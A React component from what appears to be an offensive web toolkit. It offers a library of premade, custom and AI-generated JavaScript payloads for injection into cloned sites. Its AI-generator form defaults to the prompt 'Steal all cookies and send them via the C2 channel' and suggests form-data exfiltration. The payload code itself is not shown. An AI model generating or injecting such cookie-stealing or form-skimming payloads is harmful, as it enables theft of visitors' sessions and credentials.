
'use client';

import { useState, useEffect } from 'react';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import { z } from 'zod';
import { Card, CardHeader, CardTitle, CardDescription, CardContent } from '@/components/ui/card';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { ScrollArea } from '@/components/ui/scroll-area';
import { Button } from '@/components/ui/button';
import { Textarea } from '@/components/ui/textarea';
import { useToast } from '@/hooks/use-toast';
import { Loader2, Sparkles, PlusCircle, Trash2, Library, Code } from 'lucide-react';
import { PREMADE_PAYLOADS } from '@/lib/js-payloads';
import { useLocalStorage } from '@/hooks/use-local-storage';
import { generateJsPayload } from '@/ai/flows/js-payload-generator-flow';
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from './ui/form';
import { Input } from './ui/input';
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogFooter,
  DialogHeader,
  DialogTitle,
  DialogTrigger,
} from "@/components/ui/dialog"


export type JsPayload = {
    name: string;
    description: string;
    code: string;
};

type JavaScriptLibraryProps = {
    onSelectPayload: (payload: JsPayload) => void;
};

const aiFormSchema = z.object({
  prompt: z.string().min(10, "Please describe the desired functionality."),
});

const customFormSchema = z.object({
  name: z.string().min(3, "Name is required."),
  description: z.string().min(10, "Description is required."),
  code: z.string().min(20, "Code must be at least 20 characters."),
});

export function JavaScriptLibrary({ onSelectPayload }: JavaScriptLibraryProps) {
    const { toast } = useToast();
    const { value: customPayloads, setValue: setCustomPayloads } = useLocalStorage<JsPayload[]>('netra-custom-js-payloads', []);

    const [isAiLoading, setIsAiLoading] = useState(false);
    const [generatedCode, setGeneratedCode] = useState<string | null>(null);

    const aiForm = useForm<z.infer<typeof aiFormSchema>>({
        resolver: zodResolver(aiFormSchema),
        defaultValues: { prompt: "Steal all cookies and send them via the C2 channel." },
    });
    
    const customForm = useForm<z.infer<typeof customFormSchema>>({
        resolver: zodResolver(customFormSchema),
        defaultValues: { name: "", description: "", code: "" },
    });

    const handleGenerateAiPayload = async (values: z.infer<typeof aiFormSchema>) => {
        setIsAiLoading(true);
        setGeneratedCode(null);
        try {
            const result = await generateJsPayload(values);
            setGeneratedCode(result.payload);
        } catch(e) {
            toast({ variant: 'destructive', title: 'Error', description: "Failed to generate AI payload." });
            console.error(e);
        } finally {
            setIsAiLoading(false);
        }
    };
    
    const handleSaveCustomPayload = (values: z.infer<typeof customFormSchema>) => {
        setCustomPayloads([...customPayloads, values]);
        toast({ title: "Payload Saved", description: `"${values.name}" has been added to your custom library.`});
        customForm.reset();
    };

    const handleDeleteCustomPayload = (payloadName: string) => {
        setCustomPayloads(customPayloads.filter(p => p.name !== payloadName));
        toast({ title: "Payload Deleted" });
    }

    const PayloadCard = ({ payload, onSelect, onDelete }: { payload: JsPayload, onSelect: (p: JsPayload) => void, onDelete?: (name: string) => void }) => (
        <Card className="flex flex-col">
            <CardHeader className="flex-grow">
                <CardTitle className="text-base">{payload.name}</CardTitle>
                <CardDescription className="text-xs">{payload.description}</CardDescription>
            </CardHeader>
            <CardContent className="flex items-center gap-2">
                <Button size="sm" onClick={() => onSelect(payload)} className="w-full">Use Payload</Button>
                {onDelete && <Button variant="ghost" size="icon" className="h-8 w-8 shrink-0" onClick={() => onDelete(payload.name)}><Trash2 className="h-4 w-4 text-destructive"/></Button>}
            </CardContent>
        </Card>
    );

    return (
        <Card>
            <CardHeader>
                <div className="flex items-center gap-3">
                    <Library className="h-6 w-6" />
                    <CardTitle>JavaScript Payload Library</CardTitle>
                </div>
                <CardDescription>
                    Select a premade payload, create your own, or generate one with AI to use in the cloner above.
                </CardDescription>
            </CardHeader>
            <CardContent>
                <Tabs defaultValue="premade">
                    <TabsList className="grid w-full grid-cols-3">
                        <TabsTrigger value="premade">Premade</TabsTrigger>
                        <TabsTrigger value="custom">Custom</TabsTrigger>
                        <TabsTrigger value="ai">AI Generator</TabsTrigger>
                    </TabsList>
                    
                    <TabsContent value="premade" className="mt-4">
                       <ScrollArea className="h-96">
                           <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4 pr-4">
                               {PREMADE_PAYLOADS.map(payload => (
                                   <PayloadCard key={payload.name} payload={payload} onSelect={onSelectPayload} />
                               ))}
                           </div>
                       </ScrollArea>
                    </TabsContent>

                    <TabsContent value="custom" className="mt-4">
                        <div className="grid md:grid-cols-2 gap-6">
                            <Form {...customForm}>
                                <form onSubmit={customForm.handleSubmit(handleSaveCustomPayload)} className="space-y-4">
                                    <FormField control={customForm.control} name="name" render={({ field }) => ( <FormItem><FormLabel>Payload Name</FormLabel><FormControl><Input {...field} /></FormControl><FormMessage /></FormItem> )}/>
                                    <FormField control={customForm.control} name="description" render={({ field }) => ( <FormItem><FormLabel>Description</FormLabel><FormControl><Input {...field} /></FormControl><FormMessage /></FormItem> )}/>
                                    <FormField control={customForm.control} name="code" render={({ field }) => ( <FormItem><FormLabel>JavaScript Code</FormLabel><FormControl><Textarea {...field} className="font-mono h-32" /></FormControl><FormMessage /></FormItem> )}/>
                                    <Button type="submit" className="w-full">Save Custom Payload</Button>
                                </form>
                            </Form>
                            <ScrollArea className="h-96">
                               <div className="grid grid-cols-1 lg:grid-cols-2 gap-4 pr-4">
                                {customPayloads.length === 0 && <p className="text-sm text-center text-muted-foreground pt-10 col-span-full">No custom payloads saved yet.</p>}
                                {customPayloads.map(payload => (
                                   <PayloadCard key={payload.name} payload={payload} onSelect={onSelectPayload} onDelete={handleDeleteCustomPayload} />
                               ))}
                               </div>
                           </ScrollArea>
                        </div>
                    </TabsContent>

                    <TabsContent value="ai" className="mt-4">
                        <Form {...aiForm}>
                           <form onSubmit={aiForm.handleSubmit(handleGenerateAiPayload)} className="space-y-4">
                                <FormField control={aiForm.control} name="prompt" render={({ field }) => ( <FormItem><FormLabel>Describe Payload</FormLabel><FormControl><Textarea {...field} placeholder="e.g., Listen for form submissions, grab the data, and exfiltrate it." className="h-24"/></FormControl><FormMessage /></FormItem> )}/>
                                <Button type="submit" disabled={isAiLoading}>
                                    {isAiLoading ? <Loader2 className="mr-2 h-4 w-4 animate-spin"/> : <Sparkles className="mr-2 h-4 w-4"/>}
                                    Generate AI Payload
                                </Button>
                           </form>
                        </Form>
                        {generatedCode && (
                            <div className="mt-4 space-y-2">
                                <h4 className="font-semibold">Generated Code</h4>
                                <Textarea value={generatedCode} readOnly className="font-mono h-48"/>
                                <Button onClick={() => onSelectPayload({ name: "AI Generated Payload", description: aiForm.getValues('prompt'), code: generatedCode })}>Use This Payload</Button>
                            </div>
                        )}
                    </TabsContent>
                </Tabs>
            </CardContent>
        </Card>
    );
}
